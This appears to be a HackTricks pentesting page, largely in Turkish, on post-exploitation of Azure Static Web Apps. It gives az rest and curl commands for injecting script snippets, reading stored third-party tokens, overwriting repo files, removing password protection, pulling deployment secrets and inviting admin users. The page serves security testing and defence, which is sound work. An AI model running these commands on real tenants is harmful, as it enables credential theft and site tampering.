# Az - Static Web Apps Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Azure Static Web Apps

Daha fazla bilgi için bakın:

{{#ref}}
../az-services/az-static-web-apps.md
{{#endref}}

### Microsoft.Web/staticSites/snippets/write

Bir snippet oluşturarak bir static web sayfasının rastgele HTML kodu yüklemesi sağlanabilir. Bu, saldırganın web app içine JS kodu enjekte etmesine ve credentials veya mnemonic keys (in web3 wallets) gibi hassas bilgileri çalmasına yol açabilir.

Aşağıdaki komut web app tarafından her zaman yüklenecek bir snippet oluşturur::
```bash
az rest \
--method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/snippets/<snippet-name>?api-version=2022-03-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"name": "supersnippet",
"location": "Body",
"applicableEnvironmentsMode": "AllEnvironments",
"content": "PHNjcmlwdD4KYWxlcnQoIkF6dXJlIFNuaXBwZXQiKQo8L3NjcmlwdD4K",
"environments": [],
"insertBottom": false
}
}'
```
### Yapılandırılmış Üçüncü Taraf Kimlik Bilgilerini Okuma

As explained in the App Service section:

{{#ref}}
../az-privilege-escalation/az-app-services-privesc.md
{{#endref}}

Aşağıdaki komutu çalıştırarak, mevcut hesapta yapılandırılmış **üçüncü taraf kimlik bilgilerini okuyabilirsiniz**. Örneğin bazı Github kimlik bilgileri farklı bir kullanıcıda yapılandırılmışsa, token'a başka bir kullanıcıdan erişemeyeceğinizi unutmayın.
```bash
az rest --method GET \
--url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
```
Bu komut Github, Bitbucket, Dropbox ve OneDrive için tokens'ları döndürür.

İşte tokens'ları kontrol etmek için bazı komut örnekleri:
```bash
# GitHub – List Repositories
curl -H "Authorization: token <token>" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/user/repos

# Bitbucket – List Repositories
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://api.bitbucket.org/2.0/repositories

# Dropbox – List Files in Root Folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
-H "Authorization: Bearer <token>" \
-H "Content-Type: application/json" \
--data '{"path": ""}'

# OneDrive – List Files in Root Folder
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://graph.microsoft.com/v1.0/me/drive/root/children
```
### Dosya üzerine yazma - routes, HTML, JS...

Uygulamayı barındıran **Github repo** içinde bir dosyayı, Azure'ın elindeki **Github token** ile aşağıdakine benzer bir istek göndererek **üzerine yazmak** mümkündür; bu istek üzerine yazılacak dosyanın yolunu, dosya içeriğini ve commit mesajını belirtir.

Bu, saldırganlar tarafından temel olarak **web uygulamasının içeriğini değiştirmek** (kötü amaçlı içerik sunmak; credentials, mnemonic keys... çalmak) veya `staticwebapp.config.json` dosyasını üzerine yazarak belirli yolları kendi sunucularına **yeniden yönlendirmek** için kötüye kullanılabilir.

> [!WARNING]
> Bir saldırgan Github repo'yu herhangi bir şekilde ele geçirmeyi başarırsa, dosyayı doğrudan Github üzerinden de üzerine yazabilir.
```bash
curl -X PUT "https://functions.azure.com/api/github/updateGitHubContent" \
-H "Content-Type: application/json" \
-d '{
"commit": {
"message": "Update static web app route configuration",
"branchName": "main",
"committer": {
"name": "Azure App Service",
"email": "donotreply@microsoft.com"
},
"contentBase64Encoded": "ewogICJuYXZpZ2F0aW9uRmFsbGJhY2siOiB7CiAgICAicmV3cml0ZSI6ICIvaW5kZXguaHRtbCIKICB9LAogICJyb3V0ZXMiOiBbCiAgICB7CiAgICAgICJyb3V0ZSI6ICIvcHJvZmlsZSIsCiAgICAgICJtZXRob2RzIjogWwogICAgICAgICJnZXQiLAogICAgICAgICJoZWFkIiwKICAgICAgICAicG9zdCIKICAgICAgXSwKICAgICAgInJld3JpdGUiOiAiL3AxIiwKICAgICAgInJlZGlyZWN0IjogIi9sYWxhbGEyIiwKICAgICAgInN0YXR1c0NvZGUiOiAzMDEsCiAgICAgICJhbGxvd2VkUm9sZXMiOiBbCiAgICAgICAgImFub255bW91cyIKICAgICAgXQogICAgfQogIF0KfQ==",
"filePath": "staticwebapp.config.json",
"message": "Update static web app route configuration",
"repoName": "carlospolop/my-first-static-web-app",
"sha": "4b6165d0ad993a5c705e8e9bb23b778dff2f9ca4"
},
"gitHubToken": "gho_1OSsm834ai863yKkdwHGj31927PCFk44BAXL"
}'
```
### Microsoft.Web/staticSites/config/write

Bu izin ile, bir static web app'i koruyan şifreyi **değiştirmek** veya hatta her ortamdaki korumayı kaldırmak mümkündür; aşağıdaki gibi bir istek gönderilerek:
```bash
# Change password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"password": "SuperPassword123.",
"secretUrl": "",
"applicableEnvironmentsMode": "AllEnvironments"
}
}'



# Remove the need of a password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"secretUrl": "",
"applicableEnvironmentsMode": "SpecifiedEnvironments",
"secretState": "None"
}
}'
```
### Microsoft.Web/staticSites/listSecrets/action

Bu izin, static app için **API key deployment token**'ı almayı sağlar.

az rest kullanılarak:
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```
AzCLI kullanarak:
```bash
az staticwebapp secrets list --name <appname> --resource-group <RG>
```
Then, in order to **token kullanarak bir uygulamayı güncellemek için** you could run the following command. Note that this command was extracted checking **Github Action [https://github.com/Azure/static-web-apps-deploy](https://github.com/Azure/static-web-apps-deploy)'ın nasıl çalıştığını** kontrol ederek çıkarılmıştır, as it's the one Azure set by default ot use. So the image and parameters could change in the future.

> [!TIP]
> Uygulamayı dağıtmak için [https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token](https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token) adresindeki **`swa`** aracını kullanabilir veya aşağıdaki ham adımları izleyebilirsiniz:

1. Repo'yu [https://github.com/staticwebdev/react-basic](https://github.com/staticwebdev/react-basic) (ya da dağıtmak istediğiniz başka bir repo) indirin ve `cd react-basic` çalıştırın.
2. Dağıtmak istediğiniz kodu değiştirin
3. Aşağıdaki komut ile deploy edin ( `<api-token>`'i değiştirmeyi unutmayın):
```bash
docker run --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN=<api-token> INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```
> [!WARNING]
> Token'a sahip olsanız bile eğer **Deployment Authorization Policy** **Github** olarak ayarlıysa uygulamayı deploy edemezsiniz. Token'ı kullanmak için deployment yöntemini APi token'ı kullanacak şekilde değiştirmek üzere `Microsoft.Web/staticSites/write` iznine ihtiyacınız olacak.

### Microsoft.Web/staticSites/write

Bu izin ile **static web app'in kaynağını farklı bir Github repository'sine değiştirmek** mümkün, ancak bu otomatik olarak provision edilmeyecek çünkü bu işlem bir Github Action tarafından yapılmalıdır.

Ancak, eğer **Deployment Authotization Policy** **Github** olarak ayarlıysa, uygulamayı **yeni kaynak deposundan güncellemek** mümkün olacaktır!.

Eğer **Deployment Authorization Policy** Github olarak ayarlı değilse, bunu aynı `Microsoft.Web/staticSites/write` izni ile değiştirebilirsiniz.
```bash
# Change the source to a different Github repository
az staticwebapp update --name my-first-static-web-app --resource-group Resource_Group_1 --source https://github.com/carlospolop/my-first-static-web-app -b main

# Update the deployment method to Github
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>?api-version=2022-09-01" \
--headers 'Content-Type=application/json' \
--body '{
"properties": {
"allowConfigFileUpdates": true,
"stagingEnvironmentPolicy": "Enabled",
"buildProperties": {
"appLocation": "/",
"apiLocation": "",
"appArtifactLocation": "build"
},
"deploymentAuthPolicy": "GitHub",
"repositoryToken": "<github_token>" # az rest --method GET --url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
}
}'
```
Uygulamayı dağıtmak için örnek Github Action:
```yaml
name: Azure Static Web Apps CI/CD

on:
push:
branches:
- main
pull_request:
types: [opened, synchronize, reopened, closed]
branches:
- main

jobs:
build_and_deploy_job:
if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')
runs-on: ubuntu-latest
name: Build and Deploy Job
permissions:
id-token: write
contents: read
steps:
- uses: actions/checkout@v3
with:
submodules: true
lfs: false
- name: Install OIDC Client from Core Package
run: npm install @actions/core@1.6.0 @actions/http-client
- name: Get Id Token
uses: actions/github-script@v6
id: idtoken
with:
script: |
const coredemo = require('@actions/core')
return await coredemo.getIDToken()
result-encoding: string
- name: Build And Deploy
id: builddeploy
uses: Azure/static-web-apps-deploy@v1
with:
azure_static_web_apps_api_token: "12345cbb198a77a092ff885782a62a15d5aef5e3654cac1234509ab54547270704-4140ccee-e04f-424f-b4ca-3d4dd123459c00f0702071d12345" # A valid formatted token is needed although it won't be used for authentication
action: "upload"
###### Repository/Build Configurations - These values can be configured to match your app requirements. ######
# For more information regarding Static Web App workflow configurations, please visit: https://aka.ms/swaworkflowconfig
app_location: "/" # App source code path
api_location: "" # Api source code path - optional
output_location: "build" # Built app content directory - optional
github_id_token: ${{ steps.idtoken.outputs.result }}
###### End of Repository/Build Configurations ######

close_pull_request_job:
if: github.event_name == 'pull_request' && github.event.action == 'closed'
runs-on: ubuntu-latest
name: Close Pull Request Job
steps:
- name: Close Pull Request
id: closepullrequest
uses: Azure/static-web-apps-deploy@v1
with:
action: "close"
```
### Microsoft.Web/staticSites/resetapikey/action

Bu izin ile **static web app'in API key'ini sıfırlamak** mümkün olup, uygulamayı otomatik olarak deploy eden workflows'ları potansiyel olarak DoSing yapabilir.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/resetapikey?api-version=2019-08-01"
```
### Microsoft.Web/staticSites/createUserInvitation/action

Bu izin, belirli bir role sahip olarak bir kullanıcıyı static web uygulaması içindeki korumalı yollara erişmesi için **kullanıcıya davet oluşturma** yetkisi verir.

Giriş, github için `/.auth/login/github` veya Entra ID için `/.auth/login/aad` gibi bir yolda bulunur ve bir kullanıcı aşağıdaki komutla davet edilebilir:
```bash
az staticwebapp users invite \
--authentication-provider Github # AAD, Facebook, GitHub, Google, Twitter \
--domain mango-beach-071d9340f.4.azurestaticapps.net # Domain of the app \
--invitation-expiration-in-hours 168 # 7 days is max \
--name my-first-static-web-app # Name of the app\
--roles "contributor,administrator" # Comma sepparated list of roles\
--user-details username # Github username in this case\
--resource-group Resource_Group_1 # Resource group of the app
```
### Pull Request'ler

Varsayılan olarak aynı repodaki bir branştan gelen Pull Request'ler otomatik olarak derlenir ve bir staging ortamında build edilir. Bu, repoda write erişimi olan fakat üretim branch'inin (genellikle `main`) branch korumalarını aşamayan bir saldırgan tarafından staging URL'sine **kötücül bir uygulama sürümü deploy etmek** için suistimal edilebilir.

The staging URL has this format: `https://<app-subdomain>-<PR-num>.<region>.<res-of-app-domain>` like: `https://ambitious-plant-0f764e00f-2.eastus2.4.azurestaticapps.net`

> [!TIP]
> Varsayılan olarak dış PR'lerin repository'ye en az 1 PR merge etmedikçe workflow'ları çalıştırmayacağını unutmayın. Bir saldırgan repo'ya geçerli bir PR gönderebilir ve **sonra kötü niyetli bir PR** göndererek kötü niyetli uygulamayı staging ortamına deploy edebilir. ANCAK, beklenmedik bir koruma vardır: static web app'e deploy eden varsayılan Github Action, dağıtım token'ını içeren secret'a (örneğin `secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_AMBITIOUS_PLANT_0F764E00F`) erişim gerektirir; deploy IDToken ile yapılsa bile. Bu, dış bir PR'nin bu secret'a erişimi olmayacağı ve bir dış PR'nin kabul edilmeden Workflow'u değiştirip buraya rastgele bir token koyamayacağı anlamına gelir; dolayısıyla **bu saldırı gerçekten çalışmayacaktır**.


{{#include ../../../banners/hacktricks-training.md}}
